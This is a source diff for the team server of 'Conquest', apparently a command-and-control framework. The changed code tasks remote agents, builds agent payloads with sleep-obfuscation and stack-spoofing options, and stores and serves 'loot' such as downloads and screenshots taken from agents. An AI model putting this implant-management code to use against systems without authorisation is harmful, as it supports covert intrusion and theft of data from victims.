@@ -1,13 +1,11 @@
+import mummy, mummy/routers
 import terminal, parsetoml, json, math, base64, times
 import strutils, strformat, system, tables
 
-import ./core/[listener, builder]
 import ./globals
 import ./db/database
-import ./core/logger
+import ./core/[listener, logger, builder, websocket]
 import ../common/[types, crypto, utils, profile, event]
-import ./websocket
-import mummy, mummy/routers
 
 proc header() = 
     echo ""
@@ -58,40 +56,58 @@ proc websocketHandler(ws: WebSocket, event: WebSocketEvent, message: Message) {.
                 cq.client.sessionKey = deriveSessionKey(cq.keyPair, publicKey)
             
                 # Send relevant information to the client
-                # - C2 profile 
-                # - agent sessions
-                # - listeners
+                # C2 profile 
                 cq.client.sendProfile(cq.profile)
+                
+                # Listeners
                 for id, listener in cq.listeners: 
                     cq.client.sendListener(listener)
+                
+                # Agent sessions
                 for id, agent in cq.agents: 
                     cq.client.sendAgent(agent)
-                cq.client.sendEventlogItem(LOG_SUCCESS_SHORT, "CQ-V1")
+
+                # Downloads & Screenshots metadata
+                for lootItem in cq.dbGetLoot():
+                    cq.client.sendLoot(lootItem)
+
+                cq.client.sendEventlogItem(LOG_SUCCESS_SHORT, "Connected to Conquest team server.")
 
             of CLIENT_AGENT_TASK:
                 let agentId = event.data["agentId"].getStr()
+                let command = event.data["command"].getStr()
                 let task = event.data["task"].to(Task) 
                 cq.agents[agentId].tasks.add(task)
 
+                let timestamp = event.timestamp.fromUnix().local().format("dd-MM-yyyy HH:mm:ss")
+                log(fmt"[{timestamp}]{$LOG_COMMAND}{command}", agentId)
+
             of CLIENT_LISTENER_START:
                 let listener = event.data.to(UIListener)
-                cq.listenerStart(listener.listenerId, listener.address, listener.port, listener.protocol)
+                cq.listenerStart(listener.listenerId, listener.hosts, listener.address, listener.port, listener.protocol)
             
             of CLIENT_LISTENER_STOP:
                 let listenerId = event.data["listenerId"].getStr()
                 cq.listenerStop(listenerId)
 
             of CLIENT_AGENT_BUILD:
-                let 
-                    listenerId = event.data["listenerId"].getStr()
-                    sleepDelay = event.data["sleepDelay"].getInt()
-                    sleepTechnique = cast[SleepObfuscationTechnique](event.data["sleepTechnique"].getInt())
-                    spoofStack = event.data["spoofStack"].getBool()
-                    modules = cast[uint32](event.data["modules"].getInt())
-                
-                let payload = cq.agentBuild(listenerId, sleepDelay, sleepTechnique, spoofStack, modules)
+                let agentBuildInformation = event.data.to(AgentBuildInformation)
+                let payload = cq.agentBuild(agentBuildInformation)
                 if payload.len() != 0: 
                     cq.client.sendAgentPayload(payload)
+
+            of CLIENT_AGENT_REMOVE: 
+                let agentId = event.data["agentId"].getStr()
+                discard cq.dbDeleteAgentByName(agentId)
+                cq.agents.del(agentId)
+
+            of CLIENT_LOOT_REMOVE: 
+                if not cq.dbDeleteLootById(event.data["lootId"].getStr()): 
+                    cq.client.sendEventlogItem(LOG_ERROR, "Failed to delete loot.")
+
+            of CLIENT_LOOT_GET: 
+                let loot = cq.dbGetLootById(event.data["lootId"].getStr())
+                cq.client.sendLootData(loot, readFile(loot.path))
 
             else: discard
 
@@ -133,28 +149,29 @@ proc startServer*(profilePath: string) =
 
         cq.info("Using profile \"", profile.getString("name"), "\" (", profilePath ,").")
         
+        # Initialize database
+        cq.dbInit()
+        for agent in cq.dbGetAllAgents():
+            cq.agents[agent.agentId] = agent
+        for listener in cq.dbGetAllListeners():
+            cq.listeners[listener.listenerId] = listener
+
+        # Restart existing listeners
+        for listenerId, listener in cq.listeners: 
+            cq.listenerStart(listenerId, listener.hosts, listener.address, listener.port, listener.protocol)
+
+        # Start websocket server
+        var router: Router
+        router.get("/*", upgradeHandler)
+        
+        # Increased websocket message length in order to support dotnet assembly execution (1GB)
+        let server = newServer(router, websocketHandler, maxBodyLen = 1024 * 1024 * 1024, maxMessageLen = 1024 * 1024 * 1024)
+        server.serve(Port(cq.profile.getInt("team-server.port")), "0.0.0.0")
+
     except CatchableError as err:
         echo err.msg
         quit(0)
     
-    # Initialize database
-    cq.dbInit()
-    for agent in cq.dbGetAllAgents():
-        cq.agents[agent.agentId] = agent
-    for listener in cq.dbGetAllListeners():
-        cq.listeners[listener.listenerId] = listener
-
-    # Restart existing listeners
-    for listenerId, listener in cq.listeners: 
-        cq.listenerStart(listenerId, listener.address, listener.port, listener.protocol)
-
-    # Start websocket server
-    var router: Router
-    router.get("/*", upgradeHandler)
-    
-    # Increased websocket message length in order to support dotnet assembly execution (1GB)
-    let server = newServer(router, websocketHandler, maxBodyLen = 1024 * 1024 * 1024, maxMessageLen = 1024 * 1024 * 1024)
-    server.serve(Port(cq.profile.getInt("team-server.port")), "0.0.0.0")
 
 # Conquest framework entry point
 when isMainModule:
